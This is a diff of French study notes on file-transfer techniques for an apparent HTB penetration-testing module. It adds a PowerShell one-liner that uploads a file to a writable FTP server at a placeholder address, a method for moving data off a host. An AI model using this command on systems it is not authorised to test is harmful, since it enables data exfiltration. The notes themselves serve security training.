@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-03-29T13:29:00.431Z
+date: 2025-03-29T13:29:37.030Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -312,5 +312,11 @@ Au niveau du démarrage du serveur FTP, il faut aussi préciser que les clients 
 
 ```
 python3 -m pyftpdlib --port 21 --write
+```
+
+Pour envoyer un fichier vers le serveur FTP:
+
+```
+(New-Object Net.WebClient).UploadFile('ftp://<adresse>/<fichier>', '<fichier>')
 ```
 
